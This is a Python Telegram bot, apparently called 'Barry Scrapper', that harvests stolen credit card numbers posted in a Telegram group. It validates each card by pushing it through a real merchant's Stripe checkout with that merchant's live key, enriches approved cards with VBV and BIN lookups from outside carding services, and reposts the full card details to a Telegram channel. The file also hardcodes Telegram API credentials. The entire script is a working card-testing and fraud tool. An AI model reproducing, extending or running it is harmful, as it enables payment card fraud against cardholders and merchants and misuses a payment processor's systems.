import re
import asyncio
import httpx
import random
import time
import requests
from telethon import TelegramClient, events

# Telegram Config
api_id = 22092598
api_hash = "93de73c78293c85fd6feddb92f91b81a"
session_name = "cc_scraper"

group_ids = [-1002410570317]
channel_id = -1002404197649

client = TelegramClient(session_name, api_id, api_hash)

gate_names = ["Stripe Auth API"]
proxy_emojis = ["☁️", "⚡", "✨", "☀️", "🌧️", "❄️"]

cc_pattern = re.compile(r'(\d{13,16})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})')

def format_cc(match):
    cc, mm, yy, cvv = match.groups()
    yy = yy[-2:]
    return f"{cc}|{mm}|{yy}|{cvv}"

def stripe_check(cc_details):
    try:
        cc, mes, ano, cvv = cc_details.split('|')
    except:
        return {"status": "DECLINED ❌ Invalid format"}

    session = requests.Session()
    try:
        session.post(
            "https://www.tmilly.tv/checkout/submit_form_sign_up",
            params={"o": "32247"},
            headers={
                "accept": "text/html",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0"
            },
            data="authenticity_token=abc123&form%5Bemail%5D=test@mail.com&form%5Bname%5D=Tester&form%5Bterms_and_conditions%5D=on"
        )

        r = session.get("https://www.tmilly.tv/api/billings/setup_intent", params={"page": "checkouts"})
        setup_intent = r.json().get("setup_intent", "")
        seti_id = setup_intent.split("_secret_")[0]

        payload = f'return_url=https://www.tmilly.tv/checkout/success&o=32247&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[billing_details][address][country]=IN&_stripe_account=acct_1FawFBC0yx1905mY&key=pk_live_DImPqz7QOOyx70XCA9DSifxb&client_secret={setup_intent}'

        res = session.post(
            f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm",
            headers={
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0"
            },
            data=payload
        )

        try:
            j = res.json()
            if j.get("status") == "succeeded":
                return {"status": "APPROVED ✅"}
            elif "error" in j:
                return {"status": f"DECLINED ❌ {j['error'].get('message', 'Unknown decline')}"}
            else:
                return {"status": "DECLINED ❌ Unknown reason"}
        except:
            return {"status": f"DECLINED ❌ {res.text[:80]}"}
    except Exception as e:
        return {"status": f"DECLINED ❌ {str(e)}"}

async def vbv_check(cc_details):
    try:
        url = "https://api.voidapi.xyz/v2/vbv"
        headers = {"User-Agent": "Mozilla/5.0"}
        params = {"card": cc_details}
        async with httpx.AsyncClient() as client:
            response = await client.get(url, headers=headers, params=params, timeout=10)
            data = response.json()
            return data.get("vbv_status", "❌ VBV Check Failed")
    except Exception as e:
        return f"❌ VBV Error: {str(e)}"

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(url, timeout=10)
            data = response.json()
            return {
                "country": data.get("country_name", "Unknown"),
                "flag": data.get("country_flag", "🏳"),
                "bank": data.get("bank", "Unknown"),
                "type": f"{data.get('type', 'Unknown')} - {data.get('brand', 'Unknown')}"
            }
        except:
            return {"country": "Unknown", "flag": "🏳", "bank": "Unknown", "type": "Unknown"}

sent_ccs = set()

@client.on(events.NewMessage())
async def fast_scraper(event):
    if event.chat_id not in group_ids:
        return
    try:
        text = event.raw_text
        found_ccs = set()
        text = re.sub(r"[^\d\s|/-]", "", text)
        for match in cc_pattern.finditer(text):
            formatted_cc = format_cc(match)
            found_ccs.add(formatted_cc)

        if found_ccs:
            for cc in found_ccs:
                if cc in sent_ccs:
                    print(f"[SKIPPED] Already checked: {cc}")
                    continue

                sent_ccs.add(cc)
                result = stripe_check(cc)
                print("Stripe Result:", result)

                if "APPROVED" in result["status"]:
                    start_time = time.time()
                    vbv_status = await vbv_check(cc)
                    bin_info = await get_bin_info(cc[:6])
                    end_time = time.time()
                    time_taken = round(end_time - start_time, 2)

                    gate = random.choice(gate_names)
                    proxy_emoji = random.choice(proxy_emojis)

                    message = f"""
[ϟ] 𝗕𝗮𝗿𝗿𝘆 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 | [$scr]

𝗦𝘁𝗮𝘁𝘂𝘀 - Process Completed
━━━━━━━━━━━━━
[ϟ] 𝗖𝗖 - <code>{cc}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Approved ✅
[ϟ] 𝗚𝗮𝘁𝗲 - {gate}
━━━━━━━━━━━━━
[ϟ] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[ϟ] 𝗕𝗶𝗻 : <code>{cc[:6]}</code>
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : <code>{bin_info['country']} {bin_info['flag']}</code>
[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : <code>{bin_info['bank']}</code>
[ϟ] 𝗧𝘆𝗽𝗲 : <code>{bin_info['type']}</code>
━━━━━━━━━━━━━
[ϟ] T/t : {time_taken} sec | Proxy : Live {proxy_emoji}
[ϟ] 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗱 𝗕𝘆 : <a href="https://t.me/BarryxScrapper">𝗕𝗮𝗿𝗿𝘆</a>
"""
                    await client.send_message(channel_id, message, parse_mode="HTML")
                else:
                    print(f"❌ Skipped Declined: {cc} | {result['status']}")
    except Exception as e:
        print(f"[ERROR] Scraper crashed: {e}")

# Keeps the bot alive forever with auto restart
async def run_forever():
    while True:
        try:
            await client.start()
            print("✅ Scraper Running...")
            await client.run_until_disconnected()
        except Exception as e:
            print(f"[RESTARTING] due to error: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(run_forever())
